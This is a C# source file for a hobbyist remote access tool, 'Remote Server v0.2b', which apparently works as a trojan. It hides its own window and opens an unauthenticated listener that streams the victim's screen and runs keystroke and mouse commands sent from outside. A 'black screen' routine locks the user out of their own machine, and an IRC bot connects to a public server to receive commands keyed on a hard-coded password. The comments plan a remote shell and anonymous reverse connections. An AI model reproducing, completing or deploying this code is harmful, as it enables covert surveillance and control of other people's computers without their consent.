/*******************************************************************************************
 *
 *  Remote Server v0.2b - Created by DarkTussin
 *  --------------------------------------------
 *
 *  Features:
 *  Opens a Port on the Computer Allowing Remote Control
 *  Mouse and Keyboard Commands Can Be Sent From The Client
 *  The Desktop Can Be Viewed Remotely And Update Interval Can Be Changed
 *  Server Can Be Shutdown Remotely
 *  IRCBot Provides An Additional Method of Control
 *  "Fun Commands" Will Be Implemented (Matrix Black Screen Effect Already Implemented)
 *
 *  Upcoming Features:
 *  Fully Featured IRCBot Will Provide Complete Control
 *  Remote Shell Will Be Implemented (Instead of Run as a Separate Program)
 *  Allow the Server to Connect To The Client (Much Easier Method of Connection)
 *  Password Protection For The Server
 *
 *  Current Connection Diagram:
 *  Client ------------> Server (Anything In The Way Must Be Forwarded Properly)
 *
 *  Future Connection Diagram:
 *  Client --------> IRC Server <--------- Server
 *  Client Sends IP & Port^     ---------> Server Receives Request To Connect Socket
 *  Client <------------------------------ Server Connects to Client Through Forwarded Port
 *
 *  I'm open to other ideas to connect sockets over the internet relatively anonymously
 *
 ********************************************************************************************/

using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Media;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Runtime.Serialization.Formatters.Binary;
using System.Threading;
using System.Windows.Forms;

namespace RemoteServer
{
    public partial class Form1 : Form
    {
        //DllImport Provides Control Over The Mouse
        [DllImport("user32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
        public static extern void mouse_event(long dwFlags, long dx, long dy, long cButtons, long dwExtraInfo);

        //Constant Offsets for Mouse Methods
        private const int MOUSE_LEFTDOWN = 0x02;

        private const int MOUSE_LEFTUP = 0x04;
        private const int MOUSE_RIGTDOWN = 0x08;
        private const int MOUSE_RIGHTUP = 0x10;

        //Variable Declaration
        private TcpListener listener;       //Listening Port for the Server

        private Socket mainSocket;          //Socket used for connection
        private int port;                   //Port to listen on
        private Stream s;                   //Main Stream for Communication
        private Thread eventWatcher;        //Thread to Monitor Client Commands
        private int imageDelay;             //Delay in Milliseconds for Desktop Image Send
        private Form2 bsForm;               //Black Screen Form For Matrix Fun Command
        private Debuggy debuggy;            //Debug Form For IRC Bot (To Be Removed)

        //These 2 Threads Will Be Removed When Future Mouse/Keyboard Code Is Written
        //The Code Will Simply Disable the Mouse and Keyboard Instead of Manipulating Them
        private Thread blackScreenThread;   //Thread to Block User Input For Black Screen Fun

        private Thread ownage;              //Additional Thread to Hold Mouse And Tap Escape Key

        private bool bsEnabled = false;         //Is Black Screen Enabled?
        private TcpClient ircClient;            //TcpClient to handle IRCBot
        private Stream ircStream;               //IRC Socket Stream
        private Thread ircWatcher;              //IRC Thread
        private Thread debuggyThread;           //Thread to Run Debugging Window (To Be Removed)
        private static bool DB = false;         //Debugging?
        private StreamWriter ircWriter;         //IRC Stream Writer
        private StreamReader ircReader;         //IRC Stream Reader
        private string ircServer;               //The IRC Server
        private int ircPort;                    //The IRC Port
        private string ircNick;                 //IRC Bot Nickname
        private string ircPassword = "0beyMe";  //The "command" string authorizing a user to interact
        private string ircChannel;              //The Channel to Join on Connect

        private bool ircBotIsRunning = false;
        //private const string ircServer = "irc.gamesurge.net";
        //private const int ircPort = 6667;

        public Form1()
        {
            InitializeComponent();
            port = 1338;
            imageDelay = 1000;
        }

        public Form1(int p)
        {
            port = p;
            imageDelay = 1000;
            InitializeComponent();
        }

        /// <summary>
        /// Basically The Main Method To Begin Listening
        /// </summary>
        public void startListening()
        {
            try
            {
                listener = new TcpListener(port);
                listener.Start();
                mainSocket = listener.AcceptSocket();
                s = new NetworkStream(mainSocket);
                eventWatcher = new Thread(new ThreadStart(waitForKeys));
                eventWatcher.Start();
                while (true)
                {
                    Bitmap screeny = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, PixelFormat.Format32bppArgb);
                    Graphics theShot = Graphics.FromImage(screeny);
                    theShot.ScaleTransform(.25F, .25F);
                    theShot.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);
                    BinaryFormatter bFormat = new BinaryFormatter();
                    bFormat.Serialize(s, screeny);
                    //screeny.Save(s,ImageFormat.Png);
                    Thread.Sleep(imageDelay);
                    theShot.Dispose();
                    screeny.Dispose();
                }
            }
            catch (Exception)
            {
                if (mainSocket.IsBound)
                    mainSocket.Close();
                if (listener != null)
                    listener.Stop();
                //MessageBox.Show(gay.ToString());
            }
        }

        /// <summary>
        /// The Black Screen's Method (Code Needs to be Cleaned)
        /// </summary>
        private void bsMethod()
        {
            bsForm = new Form2();
            Application.Run(bsForm);
        }

        /// <summary>
        /// Ownage Method To Disable Keyboard/Mouse Input (Code Will Be Cleaned)
        /// </summary>
        private void doOwnage()
        {
            while (true)
            {
                Cursor.Position = new Point(30, 0);
                mouse_event(MOUSE_LEFTDOWN | MOUSE_LEFTUP, Cursor.Position.X, Cursor.Position.Y, 0, 0);
                SendKeys.SendWait("{ESC}");
                Thread.Sleep(10);
            }
        }

        /// <summary>
        /// Method for the IRC Bot Debugging Method (Code Will Be Removed)
        /// </summary>
        private void debuggyMethod()
        {
            debuggy = new Debuggy();
            Application.Run(debuggy);
        }

        private void printDebug(string t)
        {
            if (DB)
                debuggy.textBox1.AppendText(t);
        }

        private void printIrc(string t)
        {
            ircWriter.WriteLine(t);
            ircWriter.Flush();
        }

        /// <summary>
        /// The IRCBot's Method
        /// </summary>
        private void startIRCBot()
        {
            try
            {
                ircBotIsRunning = true;
                if (debuggyThread.IsAlive)
                    DB = true;
                else
                    DB = false;
                //debuggy = new Debuggy();
                //Application.Run(debuggy);
                ircClient = new TcpClient(ircServer, ircPort);
                ircStream = ircClient.GetStream();
                //StreamReader ircReader = new StreamReader(ircStream);
                //ircWatcher = new Thread(new ThreadStart(ircInStream));
                //ircWatcher.Start();
                ircReader = new StreamReader(ircStream);
                ircWriter = new StreamWriter(ircStream);
                String temp = "";
                ircWriter.WriteLine("NICK " + ircNick);
                ircWriter.Flush();
                ircWriter.WriteLine("USER " + ircNick + " 8 * :I'm a C# irc bot");
                ircWriter.Flush();
                printDebug("<- " + "USER " + ircNick + " 8 * :I'm a C# irc bot" + Environment.NewLine);
                printDebug("<- " + "NICK " + ircNick + Environment.NewLine);
                while ((temp = ircReader.ReadLine()) != null)
                {
                    printDebug("-> " + temp + Environment.NewLine);
                    //Process Input
                    /*if (temp.Contains("Checking Ident"))
                    {
                        ircWriter.WriteLine("USER DTTheBot 8 * :I'm a C# irc bot");
                        ircWriter.Flush();
                        ircWriter.WriteLine("NICK DTBotFoReal");
                        ircWriter.Flush();
                        printDebug("<- " + "NICK " + ircNick + Environment.NewLine);
                        printDebug("<- " + "USER " + ircNick + " 8 * :Yea yea...I'm a beta" + Environment.NewLine);
                    }*/
                    if (temp.StartsWith("PING"))
                    {
                        //Thread.Sleep(2000);
                        ircWriter.Write("\r\nPONG " + temp.Substring(5) + "\r\n");
                        ircWriter.Flush();
                        printDebug("<- PONG " + temp.Substring(5) + Environment.NewLine);
                    }
                    if (temp.Contains(ircPassword))
                        processCommand(temp);
                }
            }
            catch (Exception gay) { MessageBox.Show("Exception Caught:\n\n" + gay); }
            finally
            {
                ircStream.Close();
                ircClient.Close();
                if (ircWatcher.IsAlive)
                    ircWatcher.Abort();
            }
        }

        private void processCommand(string c)
        {
            string[] tokens = c.Split();
            printDebug("\nProcessing Command Method Run()");
            printDebug("Full String Being Parsed:\n" + c);
            printDebug("Token List:");
            foreach (string s in tokens)
                printDebug("=> " + s);
            /*string command = c.Substring(c.IndexOf(ircPassword) + ircPassword.Length + 1);
            string args[] =
            if (command.ToLower().Contains("join"))
            {
                string channel = command.IndexOf("join");
            }*/
        }

        /// <summary>
        /// The Server Monitors Commands In This Method (To Be Renamed)
        /// </summary>
        private void waitForKeys()
        {
            try
            {
                String temp = "";
                StreamReader reader = new StreamReader(s);
                do
                {
                    temp = reader.ReadLine();
                    if (temp.StartsWith("CDELAY"))
                    {
                        imageDelay = int.Parse(temp.Substring(6, temp.Length - 6));
                    }
                    else if (temp.StartsWith("LCLICK"))
                    {
                        mouse_event(MOUSE_LEFTDOWN | MOUSE_LEFTUP, Cursor.Position.X, Cursor.Position.Y, 0, 0);
                    }
                    else if (temp.StartsWith("BSTEXT") && blackScreenThread.IsAlive)
                    {
                        bsForm.matrixText.Text = temp.Substring(6, temp.Length - 6);
                    }
                    else if (temp.StartsWith("BEEP"))
                    {
                        SystemSounds.Beep.Play();
                    }
                    else if (temp.StartsWith("BEEP2"))
                    {
                        SystemSounds.Asterisk.Play();
                    }
                    else if (temp.StartsWith("BEEP3"))
                    {
                        SystemSounds.Exclamation.Play();
                    }
                    else if (temp.StartsWith("BEEP4"))
                    {
                        SystemSounds.Hand.Play();
                    }
                    else if (temp.StartsWith("BEEP5"))
                    {
                        SystemSounds.Question.Play();
                    }
                    else if (temp.StartsWith("BLACKSCREEN"))
                    {
                        //blackScreenThread = new Thread(new ThreadStart(bsForm));
                        //blackScreenThread.Start();
                        //blackScreen = new Form2(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y);
                        //Application.Run(bsForm);
                        //bsForm.Activate();
                        if (!bsEnabled)
                        {
                            blackScreenThread = new Thread(new ThreadStart(bsMethod));
                            blackScreenThread.Start();
                            ownage = new Thread(new ThreadStart(doOwnage));
                            ownage.Start();
                            bsEnabled = true;
                        }
                        else
                        {
                            if (ownage.IsAlive)
                                ownage.Abort();
                            if (blackScreenThread.IsAlive)
                                blackScreenThread.Abort();
                            bsForm.Close();
                        }
                        //blackScreen.Show();
                        //this.Owner = blackScreen;
                        //blackScreen.Show();
                    }
                    else if (temp.StartsWith("NOBLACKSCREEN"))
                    {
                        if (ownage.IsAlive)
                            ownage.Abort();
                        if (blackScreenThread.IsAlive)
                            blackScreenThread.Abort();
                        if (bsForm.Visible)
                            bsForm.Close();
                        bsEnabled = false;
                    }
                    else if (temp.StartsWith("SHUTDOWN"))
                    {
                        mainSocket.Close();
                        listener.Stop();
                        Environment.Exit(0);
                    }
                    else if (temp.StartsWith("LDOWN"))
                    {
                        mouse_event(MOUSE_LEFTDOWN, Cursor.Position.X, Cursor.Position.Y, 0, 0);
                    }
                    else if (temp.StartsWith("LUP"))
                    {
                        mouse_event(MOUSE_LEFTUP, Cursor.Position.X, Cursor.Position.Y, 0, 0);
                    }
                    /*else if (temp.StartsWith("IRCBot"))
                    {
                        //MessageBox.Show("IRCBot Starting...");
                        if (ircBotIsRunning)
                            continue;
                        ircServer = "irc.gamesurge.net";
                        ircPort = 6667;
                        ircNick = "DarkTussin";
                        debuggyThread = new Thread(new ThreadStart(debuggyMethod));
                        debuggyThread.Start();
                        ircWatcher = new Thread(new ThreadStart(startIRCBot));
                        ircWatcher.Start();
                    }*/
                    else if (temp.StartsWith("M"))
                    {
                        int xPos = 0, yPos = 0;
                        try
                        {
                            xPos = int.Parse(temp.Substring(1, temp.IndexOf(' ')));
                            yPos = int.Parse(temp.Substring(temp.IndexOf(' '), temp.Length - temp.IndexOf(' ')));
                            Cursor.Position = new Point(xPos, yPos);
                            continue;
                        }
                        catch (Exception)
                        {
                            //MessageBox.Show(temp + " " + xPos + " " + yPos + "\n\n" + gay.ToString());
                        }
                    }
                    //if (temp.StartsWith("m")) { MessageBox.Show(temp + " received!"); }
                    //MessageBox.Show(temp + " received!");
                    else
                    {
                        SendKeys.SendWait(temp);
                    }
                }
                while (temp != null);
            }
            catch (Exception)
            {
                //MessageBox.Show(gay.ToString());
            }
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            //this.Show();
            this.Hide();
            //this.ShowDialog();
            port = 1338;
            //Thread stopSucking = new Thread(new ThreadStart(startListening));
            while (true)
            {
                try
                {
                    if (!ircBotIsRunning)
                    {
                        ircServer = "irc.gamesurge.net";
                        ircPort = 6667;
                        ircNick = "DarkTussin";
                        debuggyThread = new Thread(new ThreadStart(debuggyMethod));
                        debuggyThread.Start();
                        ircWatcher = new Thread(new ThreadStart(startIRCBot));
                        ircWatcher.Start();
                    }
                    startListening();
                    //stopSucking.Start();
                    //stopSucking.Join();
                    //Thread.Sleep(1000);
                }
                catch (Exception)
                {
                    //if (stopSucking.IsAlive)
                    //    stopSucking.Abort();
                }
            }
            //startListening();
        }
    }
}